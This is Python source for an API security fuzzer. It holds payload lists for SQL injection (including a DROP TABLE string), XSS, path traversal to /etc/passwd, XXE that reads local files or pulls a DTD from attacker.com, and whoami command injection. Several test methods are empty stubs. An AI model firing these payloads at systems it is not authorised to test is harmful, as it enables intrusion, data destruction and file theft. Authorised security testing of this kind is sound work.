"""
Advanced API fuzzer for testing endpoints with various payloads.
"""

import time
import json
from typing import Dict, List, Set, Any, Optional
import requests

from .utils import RequestUtils, generate_random_string
from .auth import AuthBypass

class AdvancedAPIFuzzer:
    """Advanced fuzzer for API security testing."""
    
    def __init__(self, base_url: str, rate_limit_delay: float = 0.1):
        self.base_url = base_url
        self.rate_limit_delay = rate_limit_delay
        self.request_utils = RequestUtils()
        self.auth_bypass = AuthBypass()
        
        # Payload dictionaries
        self.sql_injection_payloads = self._load_sql_payloads()
        self.xss_payloads = self._load_xss_payloads()
        self.path_traversal_payloads = self._load_path_traversal_payloads()
        self.xxe_payloads = self._load_xxe_payloads()
        self.command_injection_payloads = self._load_command_injection_payloads()
    
    def _load_sql_payloads(self) -> List[str]:
        """Load SQL injection payloads."""
        return [
            "'", "\"", "';", "\";", "' OR '1'='1", "\" OR \"1\"=\"1",
            "' UNION SELECT NULL--", "'; DROP TABLE users;--",
            "1' OR '1'='1' --+", "1' ORDER BY 1--+",
            "1' UNION SELECT 1,2,3--+", "1' AND (SELECT * FROM users) > 0--+",
            "1' AND SLEEP(5)--+", "1' AND 1=CONVERT(int, (SELECT @@version))--+"
        ]
    
    def _load_xss_payloads(self) -> List[str]:
        """Load XSS payloads."""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "alert('XSS')",
            "';alert('XSS');//",
            "\";alert('XSS');//"
        ]
    
    def _load_path_traversal_payloads(self) -> List[str]:
        """Load path traversal payloads."""
        return [
            "../../../../etc/passwd",
            "....//....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "..%5c..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts"
        ]
    
    def _load_xxe_payloads(self) -> List[Dict[str, str]]:
        """Load XXE payloads."""
        return [
            {
                'content-type': 'application/xml',
                'payload': '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
            },
            {
                'content-type': 'application/xml',
                'payload': '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>'
            }
        ]
    
    def _load_command_injection_payloads(self) -> List[str]:
        """Load command injection payloads."""
        return [
            "; whoami", "| whoami", "&& whoami", "|| whoami",
            "`whoami`", "$(whoami)", "'; whoami; #", "\"; whoami; #"
        ]
    
    def fuzz_endpoint(self, endpoint: str, method: str = "GET", 
                     params: Dict = None, data: Any = None, 
                     headers: Dict = None, auth: Any = None) -> List[Dict[str, Any]]:
        """Fuzz a single API endpoint with various payloads."""
        results = []
        
        # Test for SQL injection
        sql_results = self.test_sql_injection(endpoint, method, params, data, headers, auth)
        results.extend(sql_results)
        
        # Test for XSS
        xss_results = self.test_xss(endpoint, method, params, data, headers, auth)
        results.extend(xss_results)
        
        # Test for path traversal
        traversal_results = self.test_path_traversal(endpoint, method, params, data, headers, auth)
        results.extend(traversal_results)
        
        # Test for XXE (if XML content)
        xxe_results = self.test_xxe(endpoint, method, params, data, headers, auth)
        results.extend(xxe_results)
        
        # Test for command injection
        command_results = self.test_command_injection(endpoint, method, params, data, headers, auth)
        results.extend(command_results)
        
        # Test for authentication bypass
        auth_bypass_results = self.auth_bypass.test_auth_bypass(
            endpoint, method, params, data, headers, auth
        )
        results.extend(auth_bypass_results)
        
        return results
    
    def test_sql_injection(self, endpoint: str, method: str, 
                          params: Dict, data: Any, 
                          headers: Dict, auth: Any) -> List[Dict[str, Any]]:
        """Test for SQL injection vulnerabilities."""
        results = []
        
        # Test in URL parameters
        if params:
            for param_name in params.keys():
                for payload in self.sql_injection_payloads:
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    response = self.request_utils.make_request(
                        endpoint, method=method, params=test_params, 
                        headers=headers, auth=auth
                    )
                    
                    if response and self._is_sql_injection_successful(response, payload):
                        results.append({
                            'type': 'SQL Injection',
                            'parameter': param_name,
                            'payload': payload,
                            'response_status': response.status_code,
                            'evidence': self._get_evidence_from_response(response)
                        })
                    
                    time.sleep(self.rate_limit_delay)
        
        # Test in request body
        if data and isinstance(data, dict):
            for key in data.keys():
                for payload in self.sql_injection_payloads:
                    test_data = data.copy()
                    test_data[key] = payload
                    
                    response = self.request_utils.make_request(
                        endpoint, method=method, data=test_data, 
                        headers=headers, auth=auth
                    )
                    
                    if response and self._is_sql_injection_successful(response, payload):
                        results.append({
                            'type': 'SQL Injection',
                            'parameter': key,
                            'payload': payload,
                            'response_status': response.status_code,
                            'evidence': self._get_evidence_from_response(response)
                        })
                    
                    time.sleep(self.rate_limit_delay)
        
        return results
    
    def _is_sql_injection_successful(self, response: requests.Response, payload: str) -> bool:
        """Determine if SQL injection was successful based on response."""
        # Check for SQL error messages
        sql_errors = [
            'sql syntax', 'mysql_fetch', 'ORA-01756', 
            'Microsoft OLE DB Provider', 'PostgreSQL query failed',
            'SQLiteException', 'syntax error', 'mysql_num_rows',
            'mysqli_fetch', 'pg_exec', 'unclosed quotation mark'
        ]
        
        response_text = response.text.lower()
        return any(error in response_text for error in sql_errors)
    
    def test_xss(self, endpoint: str, method: str, 
                params: Dict, data: Any, 
                headers: Dict, auth: Any) -> List[Dict[str, Any]]:
        """Test for XSS vulnerabilities."""
        results = []
        
        # Similar implementation to test_sql_injection but for XSS
        # Check for payload reflection in response
        
        return results
    
    def test_path_traversal(self, endpoint: str, method: str, 
                           params: Dict, data: Any, 
                           headers: Dict, auth: Any) -> List[Dict[str, Any]]:
        """Test for path traversal vulnerabilities."""
        results = []
        
        # Similar implementation to test_sql_injection but for path traversal
        # Check for file content in response
        
        return results
    
    def test_xxe(self, endpoint: str, method: str, 
                params: Dict, data: Any, 
                headers: Dict, auth: Any) -> List[Dict[str, Any]]:
        """Test for XXE vulnerabilities."""
        results = []
        
        # Check if endpoint accepts XML
        test_headers = headers.copy() if headers else {}
        test_headers['Content-Type'] = 'application/xml'
        
        for payload_data in self.xxe_payloads:
            response = self.request_utils.make_request(
                endpoint, method=method, data=payload_data['payload'],
                headers=test_headers, auth=auth
            )
            
            if response and self._is_xxe_successful(response):
                results.append({
                    'type': 'XXE',
                    'payload': payload_data['payload'],
                    'response_status': response.status_code,
                    'evidence': self._get_evidence_from_response(response)
                })
            
            time.sleep(self.rate_limit_delay)
        
        return results
    
    def _is_xxe_successful(self, response: requests.Response) -> bool:
        """Determine if XXE was successful based on response."""
        # Check for file content or external entity references
        file_content_indicators = [
            'root:', 'daemon:', 'bin/', '/etc/passwd', '[boot loader]',
            'Windows Registry'
        ]
        
        response_text = response.text
        return any(indicator in response_text for indicator in file_content_indicators)
    
    def test_command_injection(self, endpoint: str, method: str, 
                              params: Dict, data: Any, 
                              headers: Dict, auth: Any) -> List[Dict[str, Any]]:
        """Test for command injection vulnerabilities."""
        results = []
        
        # Similar implementation to test_sql_injection but for command injection
        # Check for command output in response
        
        return results
    
    def _get_evidence_from_response(self, response: requests.Response) -> str:
        """Extract evidence of vulnerability from response."""
        evidence = f"Status: {response.status_code}"
        
        # Add snippet of response text if it's not too long
        if len(response.text) > 200:
            evidence += f", Response: {response.text[:200]}..."
        else:
            evidence += f", Response: {response.text}"
        
        return evidence
    
    def fuzz_multiple_endpoints(self, endpoints: List[Dict[str, Any]]) -> Dict[str, List[Dict[str, Any]]]:
        """Fuzz multiple API endpoints."""
        all_results = {}
        
        for endpoint_info in endpoints:
            url = endpoint_info.get('url')
            method = endpoint_info.get('method', 'GET')
            params = endpoint_info.get('params', {})
            data = endpoint_info.get('data', None)
            headers = endpoint_info.get('headers', {})
            auth = endpoint_info.get('auth', None)
            
            print(f"Fuzzing: {url}")
            results = self.fuzz_endpoint(url, method, params, data, headers, auth)
            
            if results:
                all_results[url] = results
        
        return all_results